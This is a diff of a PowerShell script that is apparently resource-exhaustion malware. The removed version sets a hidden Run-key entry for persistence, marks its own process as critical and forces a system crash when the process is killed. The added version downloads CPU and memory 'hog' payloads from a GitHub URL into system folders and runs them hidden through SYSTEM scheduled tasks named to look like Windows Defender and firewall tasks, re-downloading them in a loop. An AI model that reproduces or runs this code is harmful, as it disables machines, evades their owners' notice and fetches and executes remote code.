@@ -1,73 +1,87 @@
-# Self-elevation and persistence (unchanged)
-if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    $registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-    $scriptPath = "$env:temp\root.ps1"
-    Set-ItemProperty -Path $registryPath -Name "SystemController" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force
-    Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", "$scriptPath" -Verb RunAs
-    exit
+$cpuHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/cpu_hog.ps1"
+$memHogUri = "https://github.com/Soumyo001/progressive_overload/raw/refs/heads/main/payloads/mem_hog.ps1"
+$storageHogUri = "STORAGE_HOG_URI"
+$paths = @(
+    "$env:windir\system32\config\systemprofile\AppData\Local",
+    "$env:windir\System32",
+    "$env:windir\System32\drivers",
+    "$env:windir\System32\en-US",
+    "$env:windir\System32\LogFiles\WMI",
+    "C:\Recovery",
+    "$env:temp",
+    "$env:ProgramData",
+    "$env:windir\SysWOW64"
+)
+
+$idx = Get-Random -Minimum 0 -Maximum $paths.Length
+$memHogPath = $paths[$idx]
+$memHogPath = "$memHogPath\mem_hog.ps1"
+
+$idx = Get-Random -Minimum 0 -Maximum $paths.Length
+$storageHogPath = $paths[$idx]
+$storageHogPath = "$storageHogPath\storage_hog.ps1"
+
+$threshold = Get-Random -Minimum 65 -Maximum 86
+$idx = Get-Random -Minimum 0 -Maximum $paths.Length
+$cpuHogPath = $paths[$idx]
+$cpuHogPath = "$cpuHogPath\cpu_hog.ps1"
+$memHogTaskName = "windows defender profile"
+$storageHogTaskName = "windows firewall profile"
+$memTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $memHogPath"
+$storageTaskRunAction = "powershell -ep bypass -noP -w hidden start-process powershell.exe -windowstyle hidden $storageHogPath"
+
+function Get-RamPercentage{
+    $mem = Get-WmiObject -Class Win32_OperatingSystem
+    $totMem = $mem.TotalVirtualMemorySize
+    $free = $mem.FreeVirtualMemory
+    $used = $totMem - $free
+    $percent = ($used / $totMem) * 100
+    return [math]::Round($percent, 2)
 }
 
-# Critical process elevation (unchanged)
-$signature = @'
-[DllImport("ntdll.dll")]
-public static extern int RtlSetProcessIsCritical(uint v1, uint v2, uint v3);
-'@
-Add-Type -Name "CriticalProcess" -Namespace "WinAPI" -MemberDefinition $signature -Language CSharp -PassThru
-[WinAPI.CriticalProcess]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
-
-# File management configuration
-$fileHost = "https://your-domain.com"
-$targetFiles = @{
-    cpu_hog = "$fileHost/cpu_hog.txt"
-    memory_hog = "$fileHost/memory_hog.txt"
-}
-$downloadPath = "$env:temp\"
-$checkInterval = 60
-
-# Enhanced execution with nested elevation
-function Invoke-ChildScript {
-    param($scriptPath)
-    $elevatedProcess = Start-Process powershell.exe -PassThru -WindowStyle Hidden -ArgumentList @(
-        "-ExecutionPolicy Bypass",
-        "-NoProfile",
-        "-Command",
-        "& {",
-        "   [System.Diagnostics.Process]::GetCurrentProcess().PriorityClass = [System.Diagnostics.ProcessPriorityClass]::RealTime;",
-        "   . '$scriptPath'",
-        "}"
-    ) -Verb RunAs
-
-    # Process tracking
-    Register-ObjectEvent -InputObject $elevatedProcess -EventName Exited -Action {
-        Write-Host "Child process $($Event.SourceEventArgs.ProcessId) exited with code $($Event.SourceEventArgs.ExitCode)"
-    } | Out-Null
-}
-
-# File management and execution logic
-function Update-Files {
-    foreach ($file in $targetFiles.GetEnumerator()) {
-        $localPath = Join-Path $downloadPath $file.Key
-        if (-not (Test-Path $localPath)) {
-            Invoke-WebRequest -Uri $file.Value -OutFile $localPath -UseBasicParsing
-            Write-Host "Downloaded $($file.Key)"
+function CheckTask-And-Recreate {
+    [CmdletBinding()]
+    param (
+        [parameter(Mandatory=$true)]
+        [string]$taskName,
+        [Parameter(Mandatory=$true)]
+        [string]$taskRunAction
+    )
+    
+    begin {}
+    
+    process {
+        $tsk = schtasks /query /tn $taskName /v /fo LIST
+        if(-not $tsk){
+            schtasks /create /tn $taskName /tr "$taskRunAction" /ru SYSTEM /rl HIGHEST /sc onstart /f
+            schtasks /run /tn $taskName
+        }else{
+            if($tsk -notcontains "Run As User:                          SYSTEM"){
+                schtasks /change /tn $taskName /ru SYSTEM /rl HIGHEST
+                schtasks /end /tn $taskName
+                schtasks /run /tn $taskName
+            }
         }
-        Invoke-ChildScript -scriptPath $localPath
     }
+    
+    end {}
 }
 
-# Crash handler (unchanged)
-Register-ObjectEvent -InputObject (New-Object System.Timers.Timer) -EventName Elapsed -SourceIdentifier ProcessMonitor -Action {
-    $process = Get-Process -Name (Get-Process -Id $PID).ProcessName -ErrorAction SilentlyContinue
-    if (-not $process) {
-        Write-Host "Critical process terminated - initiating system crash"
-        Start-Process cmd.exe -ArgumentList "/c", "taskkill /im svchost.exe /f" -WindowStyle Hidden
-        Start-Process wmic.exe -ArgumentList "computersystem where name='%computername%' call shutdown /s/f/t 0" -WindowStyle Hidden
-    }
-} | Out-Null
-
-# Main loop
-Update-Files
 while ($true) {
-    Update-Files
-    Start-Sleep -Seconds $checkInterval
+
+    if(-not(Test-Path $memHogPath)){
+        iwr -Uri $memHogUri -OutFile $memHogPath
+    }
+    if(-not(Test-Path $storageHogPath)){
+        iwr -Uri $storageHogUri -OutFile $storageHogPath
+    }
+    CheckTask-And-Recreate -taskName $memHogTaskName -taskRunAction $memTaskRunAction
+    CheckTask-And-Recreate -taskName $storageHogTaskName -taskRunAction $storageTaskRunAction
+
+    $curr = Get-RamPercentage
+    if($curr -ge $threshold){
+        iwr -Uri $cpuHogUri -OutFile $cpuHogPath
+        powershell.exe -ep bypass -w hidden -noP $cpuHogPath
+    }
+
 }
